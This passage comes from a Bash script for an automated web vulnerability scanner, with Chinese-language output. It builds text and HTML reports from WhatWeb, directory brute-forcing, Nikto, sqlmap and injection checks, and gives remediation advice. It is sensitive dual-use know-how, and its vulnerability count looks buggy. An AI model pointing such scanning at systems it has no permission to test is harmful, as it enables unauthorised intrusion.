      font-family: Consolas, Monaco, 'Courier New', monospace;
      background-color: #f1f1f1;
      padding: 2px 5px;
      border-radius: 3px;
      font-size: 0.9em;
    }
    .vulnerability-detail {
      background-color: #f8f9fa;
      border: 1px solid #ddd;
      border-radius: 4px;
      padding: 15px;
      margin-bottom: 20px;
    }
    .summary-box {
      background-color: #e9ecef;
      border-radius: 4px;
      padding: 20px;
      margin: 20px 0;
    }
    .chart-container {
      height: 300px;
      margin: 20px 0;
    }
    .footer {
      margin-top: 50px;
      padding-top: 20px;
      border-top: 1px solid #eee;
      text-align: center;
      font-size: 0.8em;
      color: #777;
    }
    .badge {
      display: inline-block;
      padding: 3px 7px;
      font-size: 12px;
      font-weight: bold;
      line-height: 1;
      color: #fff;
      text-align: center;
      white-space: nowrap;
      vertical-align: middle;
      border-radius: 10px;
    }
    .badge-high {
      background-color: #dc3545;
    }
    .badge-medium {
      background-color: #ffc107;
      color: #212529;
    }
    .badge-low {
      background-color: #17a2b8;
    }
    .badge-info {
      background-color: #6c757d;
    }
    .tab {
      overflow: hidden;
      border: 1px solid #ccc;
      background-color: #f1f1f1;
      border-radius: 4px 4px 0 0;
    }
    .tab button {
      background-color: inherit;
      float: left;
      border: none;
      outline: none;
      cursor: pointer;
      padding: 14px 16px;
      transition: 0.3s;
      font-size: 16px;
    }
    .tab button:hover {
      background-color: #ddd;
    }
    .tab button.active {
      background-color: #3498db;
      color: white;
    }
    .tabcontent {
      display: none;
      padding: 6px 12px;
      border: 1px solid #ccc;
      border-top: none;
      border-radius: 0 0 4px 4px;
      animation: fadeEffect 1s;
    }
    @keyframes fadeEffect {
      from {opacity: 0;}
      to {opacity: 1;}
    }
  </style>
  <script>
    function openTab(evt, tabName) {
      var i, tabcontent, tablinks;
      tabcontent = document.getElementsByClassName("tabcontent");
      for (i = 0; i < tabcontent.length; i++) {
        tabcontent[i].style.display = "none";
      }
      tablinks = document.getElementsByClassName("tablinks");
      for (i = 0; i < tablinks.length; i++) {
        tablinks[i].className = tablinks[i].className.replace(" active", "");
      }
      document.getElementById(tabName).style.display = "block";
      evt.currentTarget.className += " active";
    }
    
    // 默認顯示第一個標簽頁
    window.onload = function() {
      document.getElementsByClassName("tablinks")[0].click();
    };
  </script>
</head>
<body>
  <div class="report-header">
    <h1>網頁漏洞掃描報告</h1>
    <p><strong>目標URL:</strong> $TARGET_URL</p>
    <p><strong>掃描時間:</strong> $(date)</p>
    <p><strong>掃描工具:</strong> 自動化網頁漏洞掃描工具 v1.2</p>
  </div>
  <div class="tab">
    <button class="tablinks" onclick="openTab(event, 'Summary')">摘要</button>
    <button class="tablinks" onclick="openTab(event, 'SQLInjection')">SQL注入</button>
    <button class="tablinks" onclick="openTab(event, 'Directories')">目錄掃描</button>
    <button class="tablinks" onclick="openTab(event, 'Nikto')">Nikto掃描</button>
    <button class="tablinks" onclick="openTab(event, 'PathTraversal')">路徑遍歷</button>
    <button class="tablinks" onclick="openTab(event, 'CommandInjection')">命令注入</button>
    <button class="tablinks" onclick="openTab(event, 'Recommendations')">安全建議</button>
  </div>
EOL

  # Web技術檢測結果摘要
  if [ -f "$OUTPUT_DIR/whatweb_results.txt" ]; then
    echo "=================================================================" >> "$report_file"
    echo "               Web技術檢測結果摘要" >> "$report_file"
    echo "=================================================================" >> "$report_file"
    echo "" >> "$report_file"
    grep -E "Title|Country|IP|Server|X-Powered-By|WordPress|Drupal|Joomla|jQuery|PHP|Framework" "$OUTPUT_DIR/whatweb_results.txt" >> "$report_file"
    echo "" >> "$report_file"

    # HTML報告 - Web技術部分
    web_tech_html=""
    if [ -f "$OUTPUT_DIR/whatweb_results.txt" ]; then
      web_tech_html="<table>
    <tr>
      <th>項目</th>
      <th>值</th>
    </tr>"

      # 提取關鍵信息並格式化為HTML表格
      while IFS= read -r line; do
        if [[ $line =~ \[(.*?)\]\[(.*?)\] ]]; then
          item="${BASH_REMATCH[1]}"
          value="${BASH_REMATCH[2]}"
          web_tech_html+="
    <tr>
      <td>$item</td>
      <td>$value</td>
    </tr>"
        fi
      done < <(grep -E "Title|Country|IP|Server|X-Powered-By|WordPress|Drupal|Joomla|jQuery|PHP|Framework" "$OUTPUT_DIR/whatweb_results.txt")

      web_tech_html+="
  </table>"
    else
      web_tech_html="<p>未進行Web技術檢測或未找到結果。</p>"
    fi
  fi

  # 目錄掃描結果摘要
  echo "=================================================================" >> "$report_file"
  echo "               目錄掃描結果摘要" >> "$report_file"
  echo "=================================================================" >> "$report_file"
  echo "使用工具: $SCAN_TOOL" >> "$report_file"
  echo "" >> "$report_file"

  # HTML報告 - 目錄掃描部分
  dir_scan_html="<h3>目錄掃描結果</h3>\n<p>使用工具: $SCAN_TOOL</p>\n"
  directories_found=0
  sensitive_dirs=()

  if [ -f "$OUTPUT_DIR/directory_scan_results.txt" ]; then
    # 根據不同的工具使用不同的解析方式
    if [ "$SCAN_TOOL" = "dirb" ]; then
      directories_found=$(grep "CODE:200" "$OUTPUT_DIR/directory_scan_results.txt" | wc -l)
      echo "發現的目錄和檔案數量: $directories_found" >> "$report_file"
      echo "" >> "$report_file"
      echo "重要發現:" >> "$report_file"

      # 列出一些常見的敏感目錄
      sensitive_dirs_output=$(grep -E "(admin|login|backup|config|setup|install|wp-admin|phpmyadmin)" "$OUTPUT_DIR/directory_scan_results.txt")
      echo "$sensitive_dirs_output" >> "$report_file"

      # 提取敏感目錄列表用於HTML報告
      while IFS= read -r line; do
        if [[ $line =~ (http[s]?:[^ ]+) ]]; then
          sensitive_dirs+=("${BASH_REMATCH[1]}")
        fi
      done < <(echo "$sensitive_dirs_output")

    elif [ "$SCAN_TOOL" = "gobuster" ]; then
      directories_found=$(grep -c "Status: 200" "$OUTPUT_DIR/directory_scan_results.txt")
      echo "發現的目錄和檔案數量: $directories_found" >> "$report_file"
      echo "" >> "$report_file"
      echo "重要發現:" >> "$report_file"

      # 列出一些常見的敏感目錄
      sensitive_dirs_output=$(grep -E "(admin|login|backup|config|setup|install|wp-admin|phpmyadmin)" "$OUTPUT_DIR/directory_scan_results.txt")
      echo "$sensitive_dirs_output" >> "$report_file"

      # 提取敏感目錄列表用於HTML報告
      while IFS= read -r line; do
        # Gobuster 的输出格式通常是 "http://example.com/path  [Status: 200] [Size: 123]"
        if [[ $line =~ ^(http[s]?:[^[:space:]]+) ]]; then  # 提取 URL 部分
            sensitive_dirs+=("${BASH_REMATCH[1]}")
        fi
      done < <(echo "$sensitive_dirs_output")
    fi

    # 添加HTML內容
    dir_scan_html+="<div class=\"summary-box\">
    <p>發現的目錄和檔案數量: <strong>$directories_found</strong></p>
  </div>"

    if [ ${#sensitive_dirs[@]} -gt 0 ]; then
      dir_scan_html+="<h4>敏感目錄發現</h4>
  <div class=\"alert-medium\">
    <p>發現 ${#sensitive_dirs[@]} 個潛在敏感目錄，這些目錄可能包含重要資訊或管理功能。</p>
    <table>
      <tr>
        <th>URL</th>
        <th>風險</th>
      </tr>"

      for dir in "${sensitive_dirs[@]}"; do
        risk="中"
        badge_class="badge-medium"

        # 根據目錄類型判斷風險級別
        if [[ $dir =~ (admin|wp-admin|phpmyadmin|manager) ]]; then
          risk="高"
          badge_class="badge-high"
        elif [[ $dir =~ (backup|config|setup|install) ]]; then
          risk="高"
          badge_class="badge-high"
        fi

        dir_scan_html+="
      <tr>
        <td><a href=\"$dir\" target=\"_blank\">$dir</a></td>
        <td><span class=\"badge $badge_class\">$risk</span></td>
      </tr>"
      done

      dir_scan_html+="
    </table>
  </div>"
    else
      dir_scan_html+="<p>未發現敏感目錄。</p>"
    fi
  else
    echo "沒有可用的目錄掃描結果" >> "$report_file"
    dir_scan_html+="<p>沒有可用的目錄掃描結果。</p>"
  fi
  echo "" >> "$report_file"

  # Nikto結果摘要
  echo "=================================================================" >> "$report_file"
  echo "               Nikto掃描結果摘要" >> "$report_file"
  echo "=================================================================" >> "$report_file"
  if [ -f "$OUTPUT_DIR/nikto_results.txt" ]; then
    echo "潛在漏洞數量: $(grep -i "vulnerability" "$OUTPUT_DIR/nikto_results.txt" | wc -l)" >> "$report_file"
    echo "" >> "$report_file"
    echo "重要發現:" >> "$report_file"

    # 提取重要漏洞
    grep -i -E "(vulnerability|disclosure|xss|injection|overflow|dos|directory traversal)" "$OUTPUT_DIR/nikto_results.txt" >> "$report_file"

    # 提取所有Nikto發現用於HTML報告
    nikto_findings=$(grep -E "\+ " "$OUTPUT_DIR/nikto_results.txt")
      # HTML 報告 - Nikto 掃描部分
    nikto_html="<h3>Nikto 掃描結果</h3>"
    if [ -n "$nikto_findings" ]; then
      nikto_html+="<p>發現 $(grep -i "vulnerability" "$OUTPUT_DIR/nikto_results.txt" | wc -l) 個潛在漏洞。</p>
      <div class='vulnerability-detail'>"
      while IFS= read -r finding; do
        nikto_html+="<p><code>$finding</code></p>"
      done <<< "$nikto_findings"
      nikto_html+="</div>"
    else
      nikto_html+="<p>沒有可用的 Nikto 掃描結果。</p>"
    fi
  else
    nikto_html="<p>沒有可用的 Nikto 掃描結果。</p>"
  fi
  echo "" >> "$report_file"



  # 路徑遍歷檢測結果摘要
    path_traversal_html=""
  if [ -f "$OUTPUT_DIR/path_traversal_results.txt" ]; then
    echo "=================================================================" >> "$report_file"
    echo "               路徑遍歷檢測結果摘要" >> "$report_file"
    echo "=================================================================" >> "$report_file"
    if grep -q "未發現路徑遍歷漏洞" "$OUTPUT_DIR/path_traversal_results.txt"; then
      echo "未發現路徑遍歷漏洞" >> "$report_file"
      path_traversal_html="<p>未發現路徑遍歷漏洞。</p>"
    else
      echo "發現路徑遍歷漏洞！" >> "$report_file"
      echo "" >> "$report_file"
      echo "易受攻擊的URL:" >> "$report_file"
      # 提取 URL 和 payload，并生成链接
      path_traversal_html="<h3>路徑遍歷檢測結果</h3>"
      path_traversal_html+="<div class='alert-high'><p>發現路徑遍歷漏洞！</p></div>"
      path_traversal_html+="<p><strong>易受攻擊的 URL:</strong></p><ul>"

      while IFS= read -r url_line; do
        if [[ $url_line =~ ^易受攻擊的URL: ]]; then
            read -r payload_line  # 读取下一行（payload）
            url=$(echo "$url_line" | awk '{print $NF}')
            payload=$(echo "$payload_line" | awk '{print $NF}')
            path_traversal_html+="<li><a href='${url}' target='_blank'><code>${url}</code></a> (Payload: <code>${payload}</code>)</li>"
        fi
      done < "$OUTPUT_DIR/path_traversal_results.txt"

      path_traversal_html+="</ul>"


    fi
    echo "" >> "$report_file"
  else
      path_traversal_html="<p>沒有進行路徑遍歷檢測或沒有結果。</p>"
  fi


  # 命令注入檢測結果摘要
  command_injection_html=""
  if [ -f "$OUTPUT_DIR/command_injection_results.txt" ]; then
    echo "=================================================================" >> "$report_file"
    echo "               命令注入檢測結果摘要" >> "$report_file"
    echo "=================================================================" >> "$report_file"
    if grep -q "未發現命令注入漏洞" "$OUTPUT_DIR/command_injection_results.txt"; then
      echo "未發現命令注入漏洞" >> "$report_file"
      command_injection_html="<p>未發現命令注入漏洞。</p>"
    else
      echo "發現命令注入漏洞！" >> "$report_file"
      echo "" >> "$report_file"
      echo "易受攻擊的URL:" >> "$report_file"
      #grep -A 1 "易受攻擊的URL" "$OUTPUT_DIR/command_injection_results.txt" | grep -v "易受攻擊的URL" >> "$report_file" #原始版本
        # HTML 報告 - 命令注入
      command_injection_html="<h3>命令注入檢測結果</h3>"
      command_injection_html+="<div class='alert-high'><p>發現命令注入漏洞！</p></div>"
      command_injection_html+="<p><strong>易受攻擊的 URL:</strong></p><ul>"

      while IFS= read -r url_line; do
        if [[ $url_line =~ ^易受攻擊的URL: ]]; then  # 匹配以 "易受攻击的URL:" 开头的行
          read -r payload_line  # 读取下一行 (payload)
          read -r duration_line # 读取下下一行 (duration)
          url=$(echo "$url_line" | awk '{print $NF}')   # 提取 URL
          payload=$(echo "$payload_line" | awk '{print $NF}')  # 提取 payload
          duration=$(echo "$duration_line" | awk '{print $NF}') # 提取 duration

          command_injection_html+="<li><a href='${url}' target='_blank'><code>${url}</code></a> (Payload: <code>${payload}</code>, 響應時間: <code>${duration}</code>)</li>"
        fi

      done < "$OUTPUT_DIR/command_injection_results.txt"
      command_injection_html+="</ul>"
    fi
    echo "" >> "$report_file"
  else
    command_injection_html="<p>沒有進行命令注入檢測或沒有結果。</p>"
  fi

  # SQLMap結果摘要
  echo "=================================================================" >> "$report_file"
  echo "               SQL注入掃描結果摘要" >> "$report_file"
  echo "=================================================================" >> "$report_file"

  # 尋找SQLMap的發現
  local sql_inj_found=$(find "$OUTPUT_DIR/sqlmap_results" -name "log" -exec grep -l "is vulnerable" {} \; 2>/dev/null)
    sql_injection_html="<h3>SQL 注入掃描結果</h3>"
  if [ -n "$sql_inj_found" ]; then
    echo "發現SQL注入漏洞！" >> "$report_file"
    echo "" >> "$report_file"
    echo "易受攻擊的URL:" >> "$report_file"

    # 列出所有發現SQL注入的URL
    for log_file in $sql_inj_found; do
      target_url=$(grep -m 1 "Target URL:" "$log_file" | cut -d' ' -f3-)
      echo "- $target_url" >> "$report_file"
          sql_injection_html+="<div class='alert-high'><p>發現 SQL 注入漏洞！</p></div>"
          sql_injection_html+="<p><strong>易受攻擊的 URL:</strong></p><ul><li><a href='${target_url}' target='_blank'><code>$target_url</code></a></li></ul>"
    done

      elif [ -f "$OUTPUT_DIR/sql_injection_results/results.txt" ]; then
    if grep -q "URL:" "$OUTPUT_DIR/sql_injection_results/results.txt"; then
      echo "備用SQL注入檢測發現漏洞！" >> "$report_file"
      echo "" >> "$report_file"
      echo "易受攻擊的URL:" >> "$report_file"
      # 直接输出，不再做额外处理
      #grep "URL:" "$OUTPUT_DIR/sql_injection_results/results.txt" -A 2  | grep -v -- "--" >> "$report_file" #舊的
      #因為現在的results.txt的格式改變了, 所以要換方法提取
      sed -n '/^URL:/,/^----/{/^URL:/p;/Payload:/p;/length diff:/p}' "$OUTPUT_DIR/sql_injection_results/results.txt" >> "$report_file"
      sql_injection_html+="$alt_sqli_html" #HTML部分也直接使用

    else
      echo "未發現SQL注入漏洞" >> "$report_file"
      sql_injection_html+="<p>未發現 SQL 注入漏洞。</p>"
    fi
  else
    echo "未發現SQL注入漏洞" >> "$report_file"
        sql_injection_html+="<p>未發現 SQL 注入漏洞。</p>"
  fi

  # 總結與建議
  echo "" >> "$report_file"
  echo "=================================================================" >> "$report_file"
  echo "               總結與建議" >> "$report_file"
  echo "=================================================================" >> "$report_file"
  echo "根據掃描結果，我們建議採取以下措施來提高網站安全性：" >> "$report_file"
  echo "" >> "$report_file"

  # 檢查是否有發現漏洞，並給出相應建議
  local has_sqli=false
  local has_path_traversal=false
  local has_cmd_injection=false

  if [ -n "$sql_inj_found" ] || grep -q "URL:" "$OUTPUT_DIR/sql_injection_results/results.txt" 2>/dev/null; then
    has_sqli=true
  fi

  if [ -f "$OUTPUT_DIR/path_traversal_results.txt" ] && ! grep -q "未發現路徑遍歷漏洞" "$OUTPUT_DIR/path_traversal_results.txt"; then
    has_path_traversal=true
  fi

  if [ -f "$OUTPUT_DIR/command_injection_results.txt" ] && ! grep -q "未發現命令注入漏洞" "$OUTPUT_DIR/command_injection_results.txt"; then
    has_cmd_injection=true
  fi

  recommendations_html="<h3>安全建議</h3>"

  if [ "$has_sqli" = true ]; then
    echo "1. SQL注入漏洞修復：" >> "$report_file"
    echo "   - 使用參數化查詢/預處理語句" >> "$report_file"
    echo "   - 實施輸入驗證和清理" >> "$report_file"
    echo "   - 使用最低權限數據庫用戶" >> "$report_file"
    echo "   - 考慮使用ORM框架" >> "$report_file"
    echo "" >> "$report_file"

    recommendations_html+="<p><strong>SQL 注入漏洞修復：</strong></p>
    <ul>
      <li>使用參數化查詢/預處理語句</li>
      <li>實施輸入驗證和清理</li>
      <li>使用最低權限數據庫用戶</li>
      <li>考慮使用ORM框架</li>
    </ul>"
  fi

  if [ "$has_path_traversal" = true ]; then
    echo "2. 路徑遍歷漏洞修復：" >> "$report_file"
    echo "   - 不要將用戶輸入直接傳遞給文件系統函數" >> "$report_file"
    echo "   - 使用安全的文件訪問庫" >> "$report_file"
    echo "   - 將用戶可訪問的文件限制在特定目錄" >> "$report_file"
    echo "   - 實施白名單文件驗證" >> "$report_file"
    echo "" >> "$report_file"
      recommendations_html+="<p><strong>路徑遍歷漏洞修復：</strong></p>
    <ul>
      <li>不要將用戶輸入直接傳遞給文件系統函數</li>
      <li>使用安全的文件訪問庫</li>
      <li>將用戶可訪問的文件限制在特定目錄</li>
      <li>實施白名單文件驗證</li>
    </ul>"
  fi

  if [ "$has_cmd_injection" = true ]; then
    echo "3. 命令注入漏洞修復：" >> "$report_file"
    echo "   - 避免在應用程序中使用shell命令" >> "$report_file"
    echo "   - 如果必須使用，嚴格過濾並處理用戶輸入" >> "$report_file"
    echo "   - 使用參數化API代替直接命令執行" >> "$report_file"
    echo "   - 在沙盒環境中執行命令" >> "$report_file"
    echo "" >> "$report_file"
    recommendations_html+="<p><strong>命令注入漏洞修復：</strong></p>
    <ul>
      <li>避免在應用程序中使用shell命令</li>
      <li>如果必須使用，嚴格過濾並處理用戶輸入</li>
      <li>使用參數化API代替直接命令執行</li>
      <li>在沙盒環境中執行命令</li>
    </ul>"
  fi

  # 通用安全建議
  echo "通用安全建議：" >> "$report_file"
  echo "- 定期更新所有軟件和組件" >> "$report_file"
  echo "- 實施Web應用防火牆(WAF)" >> "$report_file"
  echo "- 使用HTTPS並正確配置SSL/TLS" >> "$report_file"
  echo "- 實施適當的錯誤處理，避免洩露敏感訊息" >> "$report_file"
  echo "- 遵循最低權限原則" >> "$report_file"
  echo "- 定期進行安全審計和滲透測試" >> "$report_file"

    recommendations_html+="<p><strong>通用安全建議：</strong></p>
    <ul>
      <li>定期更新所有軟件和組件</li>
      <li>實施Web應用防火牆(WAF)</li>
      <li>使用HTTPS並正確配置SSL/TLS</li>
      <li>實施適當的錯誤處理，避免洩露敏感訊息</li>
      <li>遵循最低權限原則</li>
      <li>定期進行安全審計和滲透測試</li>
    </ul>"


  # 組裝 HTML 報告內容
  cat >> "$html_report" <<EOL
  <div id="Summary" class="tabcontent">
    <h2>摘要</h2>
    <div class="summary-box">
        <p><strong>目標 URL:</strong> $TARGET_URL</p>
        <p><strong>掃描時間:</strong> $(date)</p>
        <p>共發現 $(($has_sqli + $has_path_traversal + $has_cmd_injection)) 類漏洞。</p>
    </div>
     <h2>Web 技術檢測</h2>
        $web_tech_html
  </div>

  <div id="SQLInjection" class="tabcontent">
    <h2>SQL 注入</h2>
    $sql_injection_html
  </div>

  <div id="Directories" class="tabcontent">
    $dir_scan_html
  </div>

  <div id="Nikto" class="tabcontent">
      $nikto_html
  </div>
  
  <div id="PathTraversal" class="tabcontent">
    $path_traversal_html
  </div>

  <div id="CommandInjection" class="tabcontent">
    $command_injection_html
  </div>

  <div id="Recommendations" class="tabcontent">
    $recommendations_html
  </div>


  <div class="footer">
    <p>本報告由自動化網頁漏洞掃描工具生成。掃描結果僅供參考，可能存在誤報或漏報。建議結合人工審查以確認漏洞的真實性和影響。</p>
  </div>
</body>
</html>
EOL

  echo -e "${GREEN}[+] 掃描報告已生成: $report_file${NC}"
   echo -e "${GREEN}[+] HTML 報告已生成: $html_report${NC}"
   # 生成 file:// URL 并输出
    local absolute_path=$(realpath "$html_report")
    echo -e "${GREEN}[+] HTML 報告的 URL: file://$absolute_path${NC}"
}

# 主函數
main() {
  echo -e "${BLUE}===================================================================${NC}"
  echo -e "${BLUE}             自動化網頁漏洞掃描工具 v1.2                           ${NC}"
  echo -e "${BLUE}===================================================================${NC}"

    # 創建一個通用的確認函數
    confirm_execution() {
    local message="$1"
    while true; do
        read -r -p "${message} (y/n) " response
        case "$response" in
        [yY][eE][sS]|[yY])
            return 0  # 返回 0 表示確認執行
            ;;
        [nN][oO]|[nN])
            return 1  # 返回 1 表示取消執行
            ;;
        *)
            echo "請輸入 'y' 或 'n'"
            ;;
        esac
    done
    }

  # 檢查工具並解析參數
  check_requirements
  parse_arguments "$@"

  # 開始時間
  start_time=$(date +%s)

  # 執行掃描
  if confirm_execution "是否執行 WhatWeb 技術檢測？"; then
    detect_web_technologies
  fi

  if confirm_execution "是否執行目錄掃描 (Dirbuster/Gobuster)？"; then
    find_hidden_directories
  fi

  if confirm_execution "是否執行 Nikto 掃描？"; then
    run_nikto_scan
  fi

  if confirm_execution "是否執行路徑遍歷檢測？"; then
    detect_path_traversal
  fi

  if confirm_execution "是否執行命令注入檢測？"; then
    detect_command_injection
  fi

  # 檢查 SQLmap 是否可用
  if command -v sqlmap >/dev/null 2>&1; then
    # 獲取 SQLmap 版本
    sqlmap_version=$(sqlmap --version 2>/dev/null | grep -oE "[0-9]+\.[0-9]+\.[0-9]+" | head -n 1)

    # 嘗試使用標準的 SQLmap 掃描
    if [[ $(sqlmap --help 2>&1 | grep -c "Usage:") -gt 0 ]]; then
      if confirm_execution "是否執行 SQLmap 掃描？"; then
        find_sql_injections
      fi
      # 無論SQLmap成功與否，都使用備用方案再掃描一次
      if confirm_execution "是否執行備用的 SQL 注入檢測（即使 SQLmap 可用）？"; then
        find_sql_injections_alternative
      fi
    else
      echo -e "${YELLOW}[!] SQLmap 測試失敗，使用備用方法進行 SQL 注入掃描${NC}"
       if confirm_execution "是否執行備用的 SQL 注入檢測？"; then
        find_sql_injections_alternative
      fi
    fi
  else
    echo -e "${YELLOW}[!] SQLmap 未安裝，使用備用方法進行 SQL 注入掃描${NC}"
    if confirm_execution "是否執行備用的 SQL 注入檢測？"; then
      find_sql_injections_alternative
    fi
  fi

  generate_report

  # 結束時間
  end_time=$(date +%s)
  execution_time=$((end_time - start_time))

  # 顯示完成訊息
  echo -e "\n${GREEN}[+] 掃描完成! 執行時間: $(($execution_time / 60)) 分 $(($execution_time % 60)) 秒${NC}"
  echo -e "${GREEN}[+] 所有結果保存在: $OUTPUT_DIR${NC}"
}

# 執行主函數
main "$@"